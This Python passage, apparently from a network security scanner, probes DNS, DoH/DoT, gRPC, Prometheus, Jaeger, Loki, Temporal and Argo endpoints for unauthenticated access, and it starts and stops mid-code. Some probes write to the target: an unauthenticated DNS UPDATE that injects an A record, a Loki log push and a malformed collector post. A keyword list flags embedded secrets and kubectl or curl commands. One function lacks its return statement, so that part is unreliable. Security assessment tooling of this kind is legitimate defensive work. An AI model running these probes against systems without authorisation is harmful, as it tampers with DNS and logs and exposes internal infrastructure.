    # CLASS=ANY(255), TTL=0, RDLENGTH=0
    prereq_rr = (_dns_encode_name(update_name) +
                 struct.pack(">HHIH", 1, 255, 0, 0))

    # Update section (UPCOUNT=1): ADD A record 1.2.3.4
    rdata = socket.inet_aton("1.2.3.4")
    update_rr = (_dns_encode_name(update_name) +
                 struct.pack(">HHIH", 1, 1, 300, 4) + rdata)

    # Header: ID FLAGS ZOCOUNT PRCOUNT UPCOUNT ADCOUNT
    header = struct.pack(">HHHHHH", txid, flags, 1, 1, 1, 0)
    message = header + zone_rr + prereq_rr + update_rr

    # Try UDP first, fall back to TCP
    resp = _dns_udp(host, port, message, timeout)
    if not resp:
        resp = _dns_tcp(host, port, message, timeout)

    if resp and len(resp) >= 4:
        rcode = _dns_rcode(resp)
        if rcode == 0:  # NOERROR — UPDATE accepted
            findings.append({
                "severity": "CRITICAL",
                "title": "DDNS_UPDATE_ACCEPTED_UNAUTH — arbitrary record injection",
                "detail": (
                    f"DNS UPDATE accepted without TSIG authentication; "
                    f"zone={zone} name={update_name} A=1.2.3.4 rcode=NOERROR; "
                    "attacker can inject or overwrite arbitrary DNS records"
                ),
                "host": host,
                "port": port,
            })
        elif rcode == 5:  # REFUSED
            findings.append({
                "severity": "INFO",
                "title": "DDNS_UPDATE_REFUSED — protected",
                "detail": f"DNS UPDATE refused; zone={zone} rcode=REFUSED",
                "host": host,
                "port": port,
            })
        elif rcode == 9:  # NOTAUTH
            findings.append({
                "severity": "MEDIUM",
                "title": "DDNS_NO_TSIG — TSIG not required but update restricted",
                "detail": (
                    f"DNS UPDATE returned NOTAUTH; zone={zone}; "
                    "server enforces zone authority check but does not mandate TSIG"
                ),
                "host": host,
                "port": port,
            })

    return findings


def probe_dns_dot_doh(host: str, port: int = 853,
                      timeout: float = 5.0) -> list:
    """
    Probe for DNS-over-TLS (DoT port 853) and DNS-over-HTTPS (DoH port 443/8443).
    Checks open resolver status over each encrypted transport.
    Returns list of {severity, title, detail, host, port} dicts.
    """
    import base64
    findings = []

    # DoT: TCP/853 with TLS handshake
    dot_ctx = ssl.create_default_context()
    dot_ctx.check_hostname = False
    dot_ctx.verify_mode = ssl.CERT_NONE

    try:
        raw_s = socket.create_connection((host, port), timeout=timeout)
        tls_s = dot_ctx.wrap_socket(raw_s, server_hostname=host)
        findings.append({
            "severity": "HIGH",
            "title": "DNS_OVER_TLS_PORT_OPEN — DoT server",
            "detail": f"TLS handshake succeeded on TCP/{port}; DoT endpoint confirmed",
            "host": host,
            "port": port,
        })

        # Send A query for google.com over the established DoT connection
        q = _dns_query_msg(0xD001, 0x0100, "google.com", 1)
        tls_s.sendall(struct.pack(">H", len(q)) + q)
        tls_s.settimeout(timeout)
        raw = b""
        while len(raw) < 2:
            c = tls_s.recv(2 - len(raw))
            if not c:
                break
            raw += c
        if len(raw) == 2:
            rlen = struct.unpack(">H", raw)[0]
            resp = b""
            while len(resp) < rlen:
                c = tls_s.recv(min(4096, rlen - len(resp)))
                if not c:
                    break
                resp += c
            if resp and _dns_ancount(resp) > 0 and _dns_rcode(resp) == 0:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "DNS_OVER_TLS_OPEN_RESOLVER — full open resolver over DoT",
                    "detail": (
                        f"DoT query for google.com answered with "
                        f"{_dns_ancount(resp)} record(s); "
                        "open recursive resolver accessible over TLS/853"
                    ),
                    "host": host,
                    "port": port,
                })
        tls_s.close()
    except Exception:
        pass

    # DoH: HTTPS GET /dns-query with base64url-encoded DNS wire query
    doh_query = _dns_query_msg(0xD002, 0x0100, "google.com", 1)
    dns_param = base64.urlsafe_b64encode(doh_query).rstrip(b"=").decode()

    doh_ctx = ssl.create_default_context()
    doh_ctx.check_hostname = False
    doh_ctx.verify_mode = ssl.CERT_NONE

    for doh_port in (443, 8443):
        try:
            url = f"https://{host}:{doh_port}/dns-query?dns={dns_param}"
            req = urllib.request.Request(url)
            req.add_header("Accept", "application/dns-message, application/dns-json")
            with urllib.request.urlopen(req, context=doh_ctx, timeout=timeout) as r:
                body = r.read()
                ct = r.headers.get("Content-Type", "")
                findings.append({
                    "severity": "HIGH",
                    "title": "DNS_OVER_HTTPS_ENDPOINT — DoH server",
                    "detail": (
                        f"GET /dns-query?dns=... returned HTTP 200 on port {doh_port}; "
                        f"content-type={ct}"
                    ),
                    "host": host,
                    "port": doh_port,
                })
                # Determine if it resolved the query (open resolver check)
                answered = False
                if body and not body.startswith(b"{"):
                    try:
                        if _dns_ancount(body) > 0 and _dns_rcode(body) == 0:
                            answered = True
                    except Exception:
                        pass
                elif body and body.startswith(b"{"):
                    try:
                        doh_json = json.loads(body)
                        if doh_json.get("Answer"):
                            answered = True
                    except Exception:
                        pass
                if answered:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "DOH_OPEN_RESOLVER_UNAUTH",
                        "detail": (
                            f"DoH endpoint on port {doh_port} resolves external queries "
                            "without authentication; open resolver via HTTPS"
                        ),
                        "host": host,
                        "port": doh_port,
                    })
            break  # DoH endpoint found; stop port iteration
        except Exception:
            continue


# ─── gRPC ──────────────────────────────────────────────────────────────────

def probe_grpc_reflection(host: str, port: int = 50051,
                          timeout: float = 5.0) -> list:
    """
    Probe for unauthenticated gRPC services via HTTP/2 negotiation and
    server reflection.  Checks plain-TCP port 50051 then gRPC-over-TLS
    on port 443.

    Technique grounded in Go for DevOps ch.6 (gRPC client/server over HTTP/2):
    gRPC frames HTTP/2; the standard client preface is the definitive
    discriminator between an HTTP/2-capable endpoint and raw TCP.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings = []

    # HTTP/2 client preface: magic string + empty SETTINGS frame
    # Frame layout: Length(3) Type(1=0x04) Flags(1) StreamID(4)
    H2_PREFACE = (
        b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        b"\x00\x00\x00"   # Length = 0 (empty SETTINGS payload)
        b"\x04"           # Type   = SETTINGS
        b"\x00"           # Flags  = none
        b"\x00\x00\x00\x00"  # Stream ID = 0
    )

    def _send_h2_preface(sock) -> bytes:
        """Send H2 client preface; return up to 1024 bytes of server response."""
        sock.sendall(H2_PREFACE)
        sock.settimeout(timeout)
        buf = b""
        try:
            while len(buf) < 1024:
                chunk = sock.recv(1024 - len(buf))
                if not chunk:
                    break
                buf += chunk
                # Stop once we have at least one complete 9-byte frame header
                if len(buf) >= 9:
                    break
        except Exception:
            pass
        return buf

    # ── Plain TCP / port 50051 ────────────────────────────────────────────
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        findings.append({
            "severity": "MEDIUM",
            "title": "GRPC_PORT_OPEN",
            "detail": f"TCP/{port} accepts connections; potential gRPC service endpoint",
            "host": host,
            "port": port,
        })

        resp = _send_h2_preface(s)
        s.close()

        # A valid HTTP/2 SETTINGS frame starts with type byte 0x04 at offset 3
        # Server preface is a SETTINGS frame (type=4) on stream 0
        if len(resp) >= 9 and resp[3:4] == b"\x04":
            findings.append({
                "severity": "HIGH",
                "title": "GRPC_H2_RESPONSIVE",
                "detail": (
                    f"Host returned HTTP/2 SETTINGS frame on TCP/{port}; "
                    "confirmed HTTP/2-capable endpoint consistent with gRPC"
                ),
                "host": host,
                "port": port,
            })

        # Check whether any HTTP headers advertise gRPC framing
        if b"grpc-status" in resp or b"grpc-message" in resp or b"content-type: application/grpc" in resp.lower():
            findings.append({
                "severity": "HIGH",
                "title": "GRPC_SERVICE_IDENTIFIED",
                "detail": (
                    f"Response on TCP/{port} contains gRPC framing headers "
                    "(grpc-status / grpc-message / content-type:application/grpc); "
                    "unauth gRPC service surface"
                ),
                "host": host,
                "port": port,
            })

    except Exception:
        pass

    # ── gRPC-over-TLS / port 443 ─────────────────────────────────────────
    tls_ctx = ssl.create_default_context()
    tls_ctx.check_hostname = False
    tls_ctx.verify_mode = ssl.CERT_NONE
    # Negotiate HTTP/2 via ALPN when available
    try:
        tls_ctx.set_alpn_protocols(["h2", "http/1.1"])
    except AttributeError:
        pass

    try:
        raw_s = socket.create_connection((host, 443), timeout=timeout)
        tls_s = tls_ctx.wrap_socket(raw_s, server_hostname=host)
        resp = _send_h2_preface(tls_s)
        tls_s.close()

        if len(resp) >= 9 and resp[3:4] == b"\x04":
            findings.append({
                "severity": "HIGH",
                "title": "GRPC_TLS_SERVICE",
                "detail": (
                    "gRPC-over-TLS confirmed on TCP/443: HTTP/2 SETTINGS handshake "
                    "succeeded after TLS negotiation; unauth gRPC surface on standard HTTPS port"
                ),
                "host": host,
                "port": 443,
            })
        elif resp and (b"grpc" in resp.lower() or resp[3:4] == b"\x04"):
            findings.append({
                "severity": "HIGH",
                "title": "GRPC_TLS_SERVICE",
                "detail": (
                    "gRPC framing detected on TLS/443; possible gRPC-Web or gRPC gateway"
                ),
                "host": host,
                "port": 443,
            })
    except Exception:
        pass

    return findings


# ─── Prometheus ─────────────────────────────────────────────────────────────

def probe_prometheus_metrics_endpoint(host: str, port: int = 9090,
                                      timeout: float = 5.0) -> list:
    """
    Probe for unauthenticated Prometheus, Pushgateway, and Alertmanager
    HTTP endpoints.  Checks /metrics, /api/v1/targets, /api/v1/query,
    and /api/v1/alertmanagers on the primary port, then repeats /metrics
    on port 9091 (Pushgateway) and 9093 (Alertmanager).

    Grounded in Go for DevOps ch.9 (OTel + Prometheus integration):
    default Prometheus listens on 9090; Pushgateway on 9091; Alertmanager
    on 9093.  All three expose /metrics unauthenticated by default.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    def _http_get(h: str, p: int, path: str, scheme: str = "http") -> tuple:
        """
        Return (status_code, headers_dict, body_bytes) or (None, {}, b"")
        on any error.  Uses urllib.request; ignores TLS cert errors.
        """
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        try:
            kwargs = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                body = r.read(65536)
                hdrs = dict(r.headers)
                return r.status, hdrs, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, {}, body
        except Exception:
            return None, {}, b""

    # ── /metrics on primary port ──────────────────────────────────────────
    for scheme in ("http", "https"):
        status, hdrs, body = _http_get(host, port, "/metrics", scheme)
        if status == 200:
            ct = hdrs.get("Content-Type", hdrs.get("content-type", ""))
            if b"# HELP" in body and (b"# TYPE" in body or b"_total" in body):
                line_count = body.count(b"\n")
                findings.append({
                    "severity": "CRITICAL",
                    "title": "PROMETHEUS_METRICS_UNAUTH — internal telemetry exposed",
                    "detail": (
                        f"GET /metrics on {scheme}://{host}:{port} returned HTTP 200 "
                        f"with Prometheus text format ({line_count} lines); "
                        f"content-type={ct}; no authentication required"
                    ),
                    "host": host,
                    "port": port,
                })
                break
        if status is not None and status != 0:
            break  # Got a real response on http; skip https

    # ── /api/v1/targets ───────────────────────────────────────────────────
    for scheme in ("http", "https"):
        status, hdrs, body = _http_get(host, port, "/api/v1/targets", scheme)
        if status == 200 and body:
            try:
                data = json.loads(body)
                active = data.get("data", {}).get("activeTargets", [])
                dropped = data.get("data", {}).get("droppedTargets", [])
                if isinstance(active, list) or isinstance(dropped, list):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "PROMETHEUS_TARGETS_UNAUTH — full scrape target list",
                        "detail": (
                            f"GET /api/v1/targets on {scheme}://{host}:{port} returned "
                            f"JSON with {len(active)} active and {len(dropped)} dropped "
                            "scrape targets; full internal infrastructure map exposed "
                            "without authentication"
                        ),
                        "host": host,
                        "port": port,
                    })
                    break
            except Exception:
                pass
        if status is not None and status != 0:
            break

    # ── /api/v1/query?query=up (arbitrary PromQL) ─────────────────────────
    for scheme in ("http", "https"):
        status, hdrs, body = _http_get(
            host, port, "/api/v1/query?query=up", scheme
        )
        if status == 200 and body:
            try:
                data = json.loads(body)
                if data.get("status") == "success":
                    result_count = len(data.get("data", {}).get("result", []))
                    findings.append({
                        "severity": "HIGH",
                        "title": "PROMETHEUS_QUERY_UNAUTH — arbitrary PromQL execution",
                        "detail": (
                            f"GET /api/v1/query?query=up on {scheme}://{host}:{port} "
                            f"returned status=success with {result_count} result(s); "
                            "arbitrary PromQL queries execute without authentication"
                        ),
                        "host": host,
                        "port": port,
                    })
                    break
            except Exception:
                pass
        if status is not None and status != 0:
            break

    # ── /api/v1/alertmanagers ─────────────────────────────────────────────
    for scheme in ("http", "https"):
        status, hdrs, body = _http_get(
            host, port, "/api/v1/alertmanagers", scheme
        )
        if status == 200 and body:
            try:
                data = json.loads(body)
                active_am = data.get("data", {}).get("activeAlertmanagers", [])
                if active_am:
                    findings.append({
                        "severity": "HIGH",
                        "title": "PROMETHEUS_ALERTMANAGER_LEAKED",
                        "detail": (
                            f"GET /api/v1/alertmanagers on {scheme}://{host}:{port} "
                            f"returned {len(active_am)} active Alertmanager endpoint(s): "
                            + ", ".join(
                                str(a.get("url", "")) for a in active_am[:5]
                            )
                        ),
                        "host": host,
                        "port": port,
                    })
                    break
            except Exception:
                pass
        if status is not None and status != 0:
            break

    # ── Pushgateway: port 9091 ────────────────────────────────────────────
    if port != 9091:
        for scheme in ("http", "https"):
            status, hdrs, body = _http_get(host, 9091, "/metrics", scheme)
            if status == 200 and b"# HELP" in body:
                findings.append({
                    "severity": "HIGH",
                    "title": "PROMETHEUS_PUSHGATEWAY_UNAUTH",
                    "detail": (
                        f"GET /metrics on {scheme}://{host}:9091 returned HTTP 200 "
                        "with Prometheus text format; Pushgateway metrics endpoint "
                        "accessible without authentication"
                    ),
                    "host": host,
                    "port": 9091,
                })
                break
            if status is not None and status != 0:
                break

    # ── Alertmanager: port 9093 ───────────────────────────────────────────
    if port != 9093:
        for scheme in ("http", "https"):
            status, hdrs, body = _http_get(host, 9093, "/metrics", scheme)
            if status == 200 and b"# HELP" in body:
                findings.append({
                    "severity": "HIGH",
                    "title": "ALERTMANAGER_METRICS_UNAUTH",
                    "detail": (
                        f"GET /metrics on {scheme}://{host}:9093 returned HTTP 200 "
                        "with Prometheus text format; Alertmanager metrics endpoint "
                        "accessible without authentication"
                    ),
                    "host": host,
                    "port": 9093,
                })
                break
            if status is not None and status != 0:
                break

    return findings


# ─── Jaeger distributed tracing ────────────────────────────────────────────

def probe_jaeger_tracing(host: str, port: int = 16686,
                         timeout: float = 5.0) -> list:
    """
    Probe for unauthenticated Jaeger distributed-tracing endpoints.

    Checks the Jaeger Query UI (default 16686) for service-list, trace
    data, and dependency-graph exposure, then probes the Jaeger collector
    HTTP port (14268) for unauthenticated ingest access.

    Grounded in Go for DevOps ch.15 (OpenTelemetry / distributed tracing):
    Jaeger is the canonical CNCF tracing backend; its UI API ships with no
    auth by default and exposes full request-flow topology, timing, and
    inter-service dependency graphs.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    def _get(h: str, p: int, path: str, scheme: str = "http") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        req.add_header("Accept", "application/json")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(131072)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, body
        except Exception:
            return None, b""

    def _post_raw(h: str, p: int, path: str, payload: bytes,
                  content_type: str = "application/x-thrift",
                  scheme: str = "http") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", content_type)
        req.add_header("User-Agent", "ablation/1.0")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    first_service: str = ""

    # ── /api/services on primary port ────────────────────────────────────────
    for scheme in ("http", "https"):
        status, body = _get(host, port, "/api/services", scheme)
        if status == 200:
            try:
                data = json.loads(body)
                services = data.get("data", [])
            except Exception:
                services = []
            if services:
                first_service = services[0] if isinstance(services[0], str) else ""
                findings.append({
                    "severity": "CRITICAL",
                    "title": "JAEGER_SERVICES_UNAUTH",
                    "detail": (
                        f"GET /api/services on {scheme}://{host}:{port} "
                        f"returned {len(services)} service(s) without authentication: "
                        + ", ".join(str(s) for s in services[:8])
                        + (" ..." if len(services) > 8 else "")
                        + " — distributed trace topology exposed"
                    ),
                    "host": host,
                    "port": port,
                })
            elif status == 200:
                # 200 but empty or unexpected shape still indicates open API
                findings.append({
                    "severity": "CRITICAL",
                    "title": "JAEGER_SERVICES_UNAUTH",
                    "detail": (
                        f"GET /api/services on {scheme}://{host}:{port} "
                        "returned HTTP 200 without authentication (empty service list)"
                    ),
                    "host": host,
                    "port": port,
                })
            break
        if status is not None and status not in (0, 404):
            break

    # ── /api/traces?service=<first> ───────────────────────────────────────────
    if first_service:
        import urllib.parse
        svc_enc = urllib.parse.quote(first_service)
        for scheme in ("http", "https"):
            status, body = _get(
                host, port,
                f"/api/traces?service={svc_enc}&limit=5",
                scheme,
            )
            if status == 200:
                try:
                    data = json.loads(body)
                    traces = data.get("data", [])
                except Exception:
                    traces = []
                if traces:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "JAEGER_TRACES_UNAUTH",
                        "detail": (
                            f"GET /api/traces?service={first_service} on "
                            f"{scheme}://{host}:{port} returned {len(traces)} "
                            "trace(s) without authentication — "
                            "request flow and timing data exposed"
                        ),
                        "host": host,
                        "port": port,
                    })
                break
            if status is not None and status not in (0, 404):
                break

    # ── /api/dependencies ─────────────────────────────────────────────────────
    for scheme in ("http", "https"):
        status, body = _get(
            host, port,
            "/api/dependencies?endTs=9999999999999&lookback=604800000",
            scheme,
        )
        if status == 200:
            try:
                data = json.loads(body)
                deps = data.get("data", [])
            except Exception:
                deps = []
            if isinstance(deps, list):
                findings.append({
                    "severity": "HIGH",
                    "title": "JAEGER_DEPENDENCY_GRAPH_UNAUTH",
                    "detail": (
                        f"GET /api/dependencies on {scheme}://{host}:{port} "
                        f"returned {len(deps)} dependency link(s) without "
                        "authentication — service dependency graph exposed"
                    ),
                    "host": host,
                    "port": port,
                })
            break
        if status is not None and status not in (0, 404):
            break

    # ── Jaeger collector HTTP (port 14268) ────────────────────────────────────
    collector_port = 14268
    if port != collector_port:
        # Malformed Thrift payload: 4-byte length prefix of 0 bytes
        malformed = b"\x00\x00\x00\x00"
        for scheme in ("http", "https"):
            status, body = _post_raw(
                host, collector_port,
                "/api/traces",
                malformed,
                "application/x-thrift",
                scheme,
            )
            if status is not None and status not in (None,):
                findings.append({
                    "severity": "MEDIUM",
                    "title": "JAEGER_COLLECTOR_REACHABLE",
                    "detail": (
                        f"POST /api/traces on {scheme}://{host}:{collector_port} "
                        f"responded HTTP {status} to a malformed Thrift payload — "
                        "Jaeger collector HTTP ingest port reachable without "
                        "network-level restriction"
                    ),
                    "host": host,
                    "port": collector_port,
                })
                break
            if status is None:
                break

    return findings


# ─── Loki log aggregation ───────────────────────────────────────────────────

def probe_loki_log_aggregation(host: str, port: int = 3100,
                               timeout: float = 5.0) -> list:
    """
    Probe for unauthenticated Grafana Loki log-aggregation endpoints.

    Checks label enumeration, log stream querying, series listing, and
    unauthenticated log push on the default Loki HTTP port (3100).

    Grounded in Go for DevOps ch.15 (OTel + observability stack): Loki is
    the standard log-aggregation backend paired with Prometheus/Grafana.
    All four HTTP API routes are unauthenticated in the default single-binary
    deployment, exposing full log metadata and content.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    def _get(h: str, p: int, path: str, scheme: str = "http") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        req.add_header("Accept", "application/json")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(131072)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, body
        except Exception:
            return None, b""

    def _post_json(h: str, p: int, path: str, payload: bytes,
                   scheme: str = "http") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", "ablation/1.0")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    # ── /loki/api/v1/labels ───────────────────────────────────────────────────
    for scheme in ("http", "https"):
        status, body = _get(host, port, "/loki/api/v1/labels", scheme)
        if status == 200:
            try:
                data = json.loads(body)
                labels = data.get("data", [])
            except Exception:
                labels = []
            findings.append({
                "severity": "CRITICAL",
                "title": "LOKI_LABELS_UNAUTH",
                "detail": (
                    f"GET /loki/api/v1/labels on {scheme}://{host}:{port} "
                    f"returned {len(labels)} label name(s) without authentication"
                    + (
                        ": " + ", ".join(str(l) for l in labels[:10])
                        if labels else ""
                    )
                    + " — log metadata exposed"
                ),
                "host": host,
                "port": port,
            })
            break
        if status is not None and status not in (0, 404):
            break

    # ── /loki/api/v1/query (stream query) ────────────────────────────────────
    # LogQL selector matching any job label value
    for scheme in ("http", "https"):
        status, body = _get(
            host, port,
            '/loki/api/v1/query?query={job%3D~".%2B"}&limit=5',
            scheme,
        )
        if status == 200:
            try:
                data = json.loads(body)
                streams = (
                    data.get("data", {}).get("result", [])
                    if isinstance(data.get("data"), dict)
                    else []
                )
            except Exception:
                streams = []
            findings.append({
                "severity": "CRITICAL",
                "title": "LOKI_LOGS_UNAUTH",
                "detail": (
                    f"GET /loki/api/v1/query on {scheme}://{host}:{port} "
                    f"returned {len(streams)} log stream(s) without authentication"
                    + (" — full log access without auth" if streams
                       else " (HTTP 200, access confirmed)")
                ),
                "host": host,
                "port": port,
            })
            break
        if status is not None and status not in (0, 404):
            break

    # ── /loki/api/v1/series ───────────────────────────────────────────────────
    for scheme in ("http", "https"):
        status, body = _get(
            host, port,
            '/loki/api/v1/series?match[]={job%3D~".%2B"}',
            scheme,
        )
        if status == 200:
            try:
                data = json.loads(body)
                series = data.get("data", [])
            except Exception:
                series = []
            findings.append({
                "severity": "HIGH",
                "title": "LOKI_SERIES_UNAUTH",
                "detail": (
                    f"GET /loki/api/v1/series on {scheme}://{host}:{port} "
                    f"returned {len(series)} series entry(-ies) without "
                    "authentication — log stream metadata exposed"
                ),
                "host": host,
                "port": port,
            })
            break
        if status is not None and status not in (0, 404):
            break

    # ── /loki/api/v1/push ─────────────────────────────────────────────────────
    import time as _time
    ts_ns = str(int(_time.time() * 1e9))
    push_payload = json.dumps({
        "streams": [{
            "stream": {"job": "ablation-probe"},
            "values": [[ts_ns, "ablation loki push probe"]],
        }]
    }).encode()

    for scheme in ("http", "https"):
        status, body = _post_json(
            host, port, "/loki/api/v1/push", push_payload, scheme
        )
        if status == 204:
            findings.append({
                "severity": "HIGH",
                "title": "LOKI_PUSH_UNAUTH",
                "detail": (
                    f"POST /loki/api/v1/push on {scheme}://{host}:{port} "
                    "returned HTTP 204 without authentication — "
                    "log injection possible; arbitrary entries accepted"
                ),
                "host": host,
                "port": port,
            })
            break
        if status is not None and status not in (0, 404):
            break

    return findings


def probe_temporal_workflow(host: str, port: int = 7233,
                            timeout: float = 10.0) -> list:
    """
    Probe for unauthenticated Temporal workflow orchestration service exposure.

    Checks gRPC frontend TCP reachability (7233), HTTP API port (8233),
    unauthenticated namespace enumeration, and workflow run listing.

    Grounded in Go for DevOps ch.13 (workflow engine design — pluggable
    orchestration systems, concurrent pre-check + canary + rollout phases)
    and ch.16 (workflow automation patterns — event-driven workflow engines):
    Temporal ships a gRPC frontend (7233) and HTTP API (8233) with no
    authentication in default single-namespace deployments, exposing
    workflow history, business logic, and activity payloads.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    def _tcp_open(h: str, p: int) -> bool:
        try:
            s = socket.create_connection((h, p), timeout=timeout)
            s.close()
            return True
        except Exception:
            return False

    def _get(h: str, p: int, path: str, scheme: str = "http") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        req.add_header("Accept", "application/json")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(131072)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, body
        except Exception:
            return None, b""

    # ── TCP 7233 — Temporal gRPC frontend ─────────────────────────────────
    if _tcp_open(host, 7233):
        findings.append({
            "severity": "HIGH",
            "title": "TEMPORAL_GRPC_OPEN",
            "detail": (
                f"TCP port 7233 open on {host} — Temporal gRPC frontend "
                "reachable; workflow orchestration service exposed"
            ),
            "host": host,
            "port": 7233,
        })

    # ── TCP 8233 — Temporal HTTP API ──────────────────────────────────────
    if _tcp_open(host, 8233):
        findings.append({
            "severity": "HIGH",
            "title": "TEMPORAL_HTTP_API_OPEN",
            "detail": (
                f"TCP port 8233 open on {host} — Temporal HTTP API "
                "frontend reachable without authentication"
            ),
            "host": host,
            "port": 8233,
        })

    # ── GET /api/v1/namespaces — namespace enumeration ────────────────────
    status, body = _get(host, 8233, "/api/v1/namespaces")
    if status == 200:
        try:
            data = json.loads(body)
            namespaces = data.get("namespaces", [])
        except Exception:
            namespaces = []
        findings.append({
            "severity": "CRITICAL",
            "title": "TEMPORAL_NAMESPACES_UNAUTH",
            "detail": (
                f"GET /api/v1/namespaces on http://{host}:8233 returned "
                f"{len(namespaces)} namespace(s) without authentication — "
                "workflow namespaces exposed"
            ),
            "host": host,
            "port": 8233,
        })

    # ── GET /api/v1/namespaces/default/workflows — workflow run list ──────
    status, body = _get(host, 8233, "/api/v1/namespaces/default/workflows")
    if status == 200:
        try:
            data = json.loads(body)
            executions = data.get("executions", [])
        except Exception:
            executions = []
        findings.append({
            "severity": "CRITICAL",
            "title": "TEMPORAL_WORKFLOW_LIST_UNAUTH",
            "detail": (
                f"GET /api/v1/namespaces/default/workflows on "
                f"http://{host}:8233 returned {len(executions)} "
                "workflow execution(s) without authentication — "
                "active workflow instances visible"
            ),
            "host": host,
            "port": 8233,
        })

    return findings


def probe_argo_workflows(host: str, port: int = 2746,
                         timeout: float = 10.0) -> list:
    """
    Probe for unauthenticated Argo Workflows API exposure.

    Checks workflow listing in default and argo namespaces, workflow
    template enumeration, and template script source code for embedded
    credentials or kubectl commands.

    Grounded in Go for DevOps ch.13 (orchestration system design —
    pluggable action executors, concurrent job dispatch) and ch.21
    (Kubernetes workload orchestration — custom resource controllers,
    CRD-based state machines): Argo Workflows runs as a Kubernetes-native
    workflow engine (default port 2746) and ships with auth-mode=server
    disabled in legacy Helm chart defaults, exposing workflow DAGs,
    script sources, and embedded credentials.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    def _get(h: str, p: int, path: str, scheme: str = "https") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        req.add_header("Accept", "application/json")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(131072)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, body
        except Exception:
            return None, b""

    _SENSITIVE_PATTERNS = (
        "password", "secret", "token", "api_key", "apikey",
        "kubectl", "aws ", "gcloud", "az ", "curl -h", "authorization:",
    )

    def _template_has_secrets(templates: list) -> list:
        hits: list = []
        for tmpl in templates:
            script = tmpl.get("script") or {}
            source = script.get("source", "")
            if not source:
                continue
            lower = source.lower()
            for pat in _SENSITIVE_PATTERNS:
                if pat in lower:
                    hits.append(tmpl.get("name", "<unnamed>"))
                    break
        return hits

    for scheme in ("https", "http"):
        # ── GET /api/v1/workflows/default ──────────────────────────────────
        status, body = _get(host, port, "/api/v1/workflows/default", scheme)
        if status == 200:
            try:
                data = json.loads(body)
                items = data.get("items") or []
            except Exception:
                items = []
            findings.append({
                "severity": "CRITICAL",
                "title": "ARGO_WORKFLOW_LIST_UNAUTH",
                "detail": (
                    f"GET /api/v1/workflows/default on "
                    f"{scheme}://{host}:{port} returned {len(items)} "
                    "workflow(s) without authentication — "
                    "workflow orchestration exposed"
                ),
                "host": host,
                "port": port,
            })
            break
        if status is not None and status not in (0, 404):
            break

    for scheme in ("https", "http"):
        # ── GET /api/v1/workflows/argo ─────────────────────────────────────
        status, body = _get(host, port, "/api/v1/workflows/argo", scheme)
        if status == 200:
            try:
                data = json.loads(body)
                items = data.get("items") or []
            except Exception:
                items = []
            findings.append({
                "severity": "CRITICAL",
